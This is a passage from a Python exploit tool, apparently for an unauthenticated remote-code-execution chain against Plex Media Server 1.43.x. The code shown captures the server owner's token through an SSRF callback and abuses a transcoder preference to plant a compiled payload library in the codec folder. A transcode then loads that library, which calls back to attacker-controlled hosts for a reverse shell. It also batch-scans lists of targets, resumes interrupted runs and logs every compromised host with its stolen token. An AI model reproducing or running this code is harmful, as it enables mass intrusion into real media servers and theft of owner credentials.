            log.close()
        except Exception:
            pass
        return 2, token if token else None

    # ---- per-target accept machinery. The accept threads poll with a timeout so
    #      they can observe accept_stop and exit; a bare blocking accept() keeps the
    #      fd alive and the port bound even after sock.close() (that leaked 4444-4446
    #      between targets).
    conn_box = {}
    got = threading.Event()
    accept_lock = threading.Lock()
    accept_stop = threading.Event()
    accept_threads = []

    def accept(sock, port):
        while not accept_stop.is_set():
            try:
                sock.settimeout(1.0)
                c, a = sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            with accept_lock:
                if got.is_set():          # another listener already won
                    try:
                        c.close()
                    except Exception:
                        pass
                    return
                conn_box["c"], conn_box["a"] = c, a
                got.set()

    try:
        for sock, port in zip(lsocks, lports):
            t = threading.Thread(target=accept, args=(sock, port), daemon=True)
            t.start()
            accept_threads.append(t)

        with redirect_stdout(log):
            Step(0).run(lambda: _hget_retry(base, "/identity", {}, None, attempts=2))
            commit("  %s✔%s %sConnecting to target%s"
                   % (C["green"], C["reset"], C["white"], C["reset"]))

            if token:
                commit("  %s✔%s %sCapturing owner token%s  %s(pre-captured: %s)%s" % (
                    C["green"], C["reset"], C["white"], C["reset"],
                    C["grey"], redact(token), C["reset"]))
            else:
                sargs = types.SimpleNamespace(
                    target=target, attacker_host=attacker_host,
                    token_port=token_port,
                    plex_port=32400, junk_token="TOTALLY_INVALID_JUNK",
                    wait=args.wait)
                token = Step(1).run(lambda: steal_owner_token(sargs))
                if not token:
                    raise RuntimeError("owner token not captured within timeout")
                commit("  %s✔%s %sCapturing owner token%s  %s(%s)%s" % (
                    C["green"], C["reset"], C["white"], C["reset"],
                    C["grey"], redact(token), C["reset"]))

            prefs_st, prefs_body = Step(2).run(
                lambda: _hget_retry(base, "/:/prefs", {}, token))
            if prefs_st != 200:
                raise RuntimeError("prefs returned %d; token may not be owner-tier" % prefs_st)
            if target_os == "windows" and not appsupport:
                m = re.search(rb'id="LocalAppDataPath"[^>]*value="([^"]*)"', prefs_body)
                if m:
                    lap = m.group(1).decode().replace("\\", "/")
                    if len(lap) >= 2 and lap[1] == ":":
                        lap = lap[2:]
                    appsupport = lap + "/Plex Media Server"
                else:
                    appsupport = "/Users/Administrator/AppData/Local/Plex Media Server"
            commit("  %s✔%s %sVerifying access%s  %s(owner)%s" % (
                C["green"], C["reset"], C["white"], C["reset"], C["grey"], C["reset"]))

            setid = discover_setid(base, token, transcoder_path)
            if not setid:
                raise RuntimeError("could not recover codec set-id; pass --setid")
            setdir = "%s/Codecs/%s-%s" % (appsupport, setid, codec_suffix)
            so_name = "hevc_decoder.dll" if target_os == "windows" \
                else "zz%d.%s" % (int(time.time()) % 100000, ext)
            so_path = "%s/%s" % (setdir, so_name)
            revsh = revshell_cmd(callouts) if target_os == "linux" else None

            def build():
                global workdir
                work = tempfile.mkdtemp(prefix="poc_shell_")
                workdir = work
                _, payload = build_payload(target_os, work, callouts, inner_cmd=revsh)
                carrier = build_carrier(work, payload, w, h)
                return work, carrier
            work, carrier = Step(3).run(build)
            commit("  %s✔%s %sBuilding payload%s  %s(%s, %d B carrier)%s" % (
                C["green"], C["reset"], C["white"], C["reset"], C["grey"],
                args.target_os, os.path.getsize(carrier), C["reset"]))

            item_xml = ITEM_XML.format(w=w, h=h, ip=local_ip, port=carrier_port,
                                       size=os.path.getsize(carrier)).encode()
            try:
                listener = Listener("0.0.0.0", carrier_port, carrier, item_xml)
            except OSError as e:
                raise RuntimeError("cannot bind carrier listener on port %d: %s"
                                   % (carrier_port, e))
            listener.start()
            time.sleep(0.3)
            item_url = "http://%s:%d/item.xml" % (local_ip, carrier_port)

            def deliver():
                _hget_retry(base, "/:/prefs",
                            {"TranscoderH264Options": "dump-yuv=%s:qp=0" % so_path},
                            token, method="PUT")
                run_transcode(base, token, item_url,
                              "SHW%d" % (int(time.time()) % 100000), w, h)
                time.sleep(10)
                _hget_retry(base, "/:/prefs", {"TranscoderH264Options": ""},
                            token, method="PUT")
            Step(4).run(deliver)
            commit("  %s✔%s %sDelivering payload%s"
                   % (C["green"], C["reset"], C["white"], C["reset"]))

            def detonate():
                run_transcode(base, token, item_url,
                              "SHD%d" % (int(time.time()) % 100000), w, h)
                got.wait(timeout=args.callout_timeout)
                return conn_box.get("c")
            conn = Step(5).run(detonate)
            listener.stop()

        if not conn:
            bar(90, 0, "", "red")
            out("\n\n  " + C["red"] + "✗ no session — payload did not call back (see log)\n"
                + C["reset"])
            out(C["grey"] + "  log: %s\n" % logpath + C["reset"])
            return 1, token if token else None

        hostlabel = target.split(":")[0].strip("[]")
        if args.exec_cmd:
            run_exec(conn, args.exec_cmd, so_path, target_os, session_label)
        else:
            interactive(conn, hostlabel, so_path, target_os, session_label)
        return 0, token if token else None
    except KeyboardInterrupt:
        SHUTDOWN.set()
        out("\n\n  " + C["grey"] + "  interrupted — cleaning up\n" + C["reset"])
        return 130, token if token else None
    except RuntimeError as e:
        out("\n\n  " + C["red"] + "✗ %s\n" % e + C["reset"])
        out(C["grey"] + "  log: %s\n" % logpath + C["reset"])
    except Exception as e:
        out("\n\n  " + C["red"] + "✗ unexpected failure: %s\n" % str(e)[:200] + C["reset"])
        out(C["grey"] + "  log: %s\n" % logpath + C["reset"])
    finally:
        # NOTE: deliberately NOT setting SHUTDOWN here. Setting it on every exit
        # (success or failure) would make the batch loop abort right after the
        # first target. Only the KeyboardInterrupt branch above sets it.
        try:
            if token:
                hget(base, "/:/prefs", {"TranscoderH264Options": ""}, token, method="PUT")
        except Exception:
            pass

        # ---- drain the shared resource list (token catcher / carrier listener),
        #      then clear it so nothing from this target leaks into the next one
        for closer, _label in reversed(ACTIVE_RESOURCES):
            try:
                closer()
            except Exception:
                pass
        ACTIVE_RESOURCES.clear()

        # ---- shut down the reverse-shell listeners: stop the accept loops FIRST,
        #      then close, then join — otherwise a thread still inside accept()
        #      holds the fd open and the port stays bound for the next target
        accept_stop.set()
        for s in lsocks:
            try:
                s.close()
            except Exception:
                pass
        for t in accept_threads:
            try:
                t.join(timeout=2.5)
            except Exception:
                pass
        lsocks = []

        if conn:
            try:
                conn.close()
            except Exception:
                pass
            conn = None
        if workdir:
            try:
                shutil.rmtree(workdir, ignore_errors=True)
            except Exception:
                pass
        try:
            log.close()
        except Exception:
            pass
    return rc, token if token else None


def main():
    ap = argparse.ArgumentParser(
        description="Plex Media Server 1.43.x — bare-WAN unauth RCE (CVSS 10.0)")
    ap.add_argument("--target", default=None,
                    help="host:port or full URL (e.g. 10.0.0.5:32400 or http://10.0.0.5:32400)")
    ap.add_argument("-f", "--file", dest="target_file", default=None,
                    help="file with a list of target URLs/hosts (bare host:port or full "
                         "http(s):// URLs, one per line; # comments and blank lines ignored; "
                         "resumable via states file)")
    ap.add_argument("--log", dest="hits_log", default=None, metavar="FILE",
                    help="append a record of every target that yielded a session to FILE "
                         "(.json extension = JSON lines; otherwise plain text with token)")
    ap.add_argument("--local-attacker-ip", default="127.0.0.1", metavar="IP",
                    help="IP the target uses to reach THIS host for the SSRF token callback "
                         "and the carrier/item.xml HTTP fetch (default 127.0.0.1). Must be "
                         "reachable from the target as-is — the script's listeners all bind "
                         "0.0.0.0 on the local ports")
    ap.add_argument("--lports", default="9001", metavar="PORT[,PORT...]",
                    help="comma-separated list of LOCAL ports to bind reverse-shell listeners "
                         "on (default 9001). One listener is opened per port; the session is "
                         "taken from whichever listener the callback lands on. Every port "
                         "must be free — the script binds them itself")
    ap.add_argument("--rports", default=None, metavar="PORT[,PORT...]",
                    help="comma-separated list of ports the PAYLOAD dials back to, tried in "
                         "order until one connects (default: same as --lports). Use this when "
                         "the ports exposed to the target differ from the locally bound ones "
                         "(e.g. ngrok forwards public port 1337 to local 9001: "
                         "--lports 9001 --rports 1337)")
    ap.add_argument("--reverse-attacker-ips", default=None, metavar="IP[,IP...]",
                    help="comma-separated list of IPs the payload dials, paired 1:1 in order "
                         "with --rports (default: one entry equal to --local-attacker-ip). "
                         "Positional pairing matters: IP n dials port n. Use when the "
                         "callout hosts differ from --local-attacker-ip or when the payload "
                         "should fall back across several hosts. On Windows targets only the "
                         "FIRST (ip, port) pair is compiled into the DLL; on Linux the shell "
                         "command loops over every pair")
    ap.add_argument("--target-os", choices=list(PLATFORMS.keys()), default="linux-native",
                    help="linux-native (default), linux-docker, or windows")
    ap.add_argument("--token", default=None,
                    help="skip the SSRF chain and use this owner token directly")
    ap.add_argument("--exec", dest="exec_cmd", default=None,
                    help="run one command and exit instead of opening a shell")
    ap.add_argument("--wait", type=int, default=150,
                    help="seconds to wait for the owner token (default 150)")
    ap.add_argument("--callout-timeout", type=int, default=45,
                    help="seconds to wait for the reverse-shell callout (default 45)")
    ap.add_argument("--delay", type=int, default=5,
                    help="seconds to wait between targets in batch mode (default 5)")
    args = ap.parse_args()

    if not args.target and not args.target_file:
        ap.error("one of --target or -f/--file is required")

    if args.target and args.target_file:
        ap.error("--target and -f/--file are mutually exclusive")

    try:
        args.lports = parse_port_list(args.lports, "--lports")
    except ValueError as e:
        sys.exit("[-] %s" % e)

    if args.rports is None:
        args.rports = list(args.lports)
    else:
        try:
            args.rports = parse_port_list(args.rports, "--rports")
        except ValueError as e:
            sys.exit("[-] %s" % e)

    if args.reverse_attacker_ips is None:
        args.reverse_attacker_ips = [args.local_attacker_ip]
    else:
        try:
            args.reverse_attacker_ips = parse_ip_list(args.reverse_attacker_ips,
                                                      "--reverse-attacker-ips")
        except ValueError as e:
            sys.exit("[-] %s" % e)
    if len(args.reverse_attacker_ips) != len(args.rports):
        sys.exit("[-] --reverse-attacker-ips (%d entries) must pair 1:1 with --rports (%d "
                 "entries)" % (len(args.reverse_attacker_ips), len(args.rports)))

    try:
        plat = resolve_platform(args.target_os)
        _validate_dependencies(["ffmpeg",
                                "gcc" if plat["os"] == "linux"
                                else "x86_64-w64-mingw32-gcc"])
    except RuntimeError as e:
        sys.exit("[-] %s" % e)

    if args.target:
        norm = normalize_target(args.target)
        if not norm:
            sys.exit("[-] --target must be host:port or a full http(s):// URL")
        targets = [norm]
        batch = False
    else:
        try:
            all_targets = _load_target_file(args.target_file)
        except RuntimeError as e:
            sys.exit("[-] %s" % e)
        file_key = _norm_path(args.target_file)

        # ---- resume: pick up from the recorded next index, if any
        states = _load_states()
        saved = states.get(file_key)
        start = 0
        if isinstance(saved, dict) and isinstance(saved.get("next"), int):
            start = saved["next"]
            if start >= len(all_targets):
                out(C["grey"] + "  states file says all targets already processed for %s "
                                 "— clearing state and starting fresh\n" % file_key
                    + C["reset"])
                _clear_state(file_key)
                start = 0
            else:
                out(C["grey"] + "  resuming %s from line index %d (target %s)\n"
                    % (file_key, start + 1, all_targets[start]) + C["reset"])
        targets = all_targets[start:]
        batch = len(targets) > 1 or start > 0

    results = []
    for i, target in enumerate(targets):
        if SHUTDOWN.is_set():
            break
        if batch:
            out("\n" + C["bold"] + C["white"] + "  [%d/%d] %s" % (i + 1, len(targets), target)
                + C["reset"] + "\n")
        rc, captured = run_single(args, target)
        results.append((target, rc))

        if rc == 0 and args.hits_log:
            append_hit_log(args.hits_log, {
                "ts": int(time.time()),
                "target": target,
                "os": args.target_os,
                "token": captured or "",
            })

        # ---- persist next index after each attempt so a kill/Ctrl-C resumes here
        if batch:
            try:
                states = _load_states()
                states[file_key] = {"next": start + i + 1,
                                    "last": target,
                                    "ts": int(time.time()),
                                    "total": len(all_targets)}
                _save_states(states)
            except Exception:
                pass

        if i < len(targets) - 1 and not SHUTDOWN.is_set() and args.delay:
            try:
                time.sleep(args.delay)
            except KeyboardInterrupt:
                SHUTDOWN.set()
                break

    # ---- all done: clear this file's state so a future run starts fresh
    if batch and not SHUTDOWN.is_set():
        _clear_state(file_key)

    if not batch:
        return 0

    # ---- batch summary
    out("\n\n  " + C["bold"] + C["white"] + "batch summary" + C["reset"] + "\n")
    hits = 0
    for target, rc in results:
        label = {0: "session", 130: "interrupted"}.get(rc, "failed (%d)" % rc)
        color = C["green"] if rc == 0 else (C["grey"] if rc == 130 else C["red"])
        mark = "✔" if rc == 0 else ("~" if rc == 130 else "✗")
        out("    %s%s%s %s  %s%s%s\n" % (color, mark, C["reset"], target,
                                         color, label, C["reset"]))
        if rc == 0:
            hits += 1
    out("\n  %d/%d targets returned a session\n" % (hits, len(results)))
    if args.hits_log and hits:
        out(C["grey"] + "  hits written to: %s\n" % args.hits_log + C["reset"])
    if SHUTDOWN.is_set():
        out(C["grey"] + "  run interrupted — rerun with the same -f file to resume "
                        "from the recorded position\n" + C["reset"])
    return 0


if __name__ == "__main__":
    sys.exit(main())
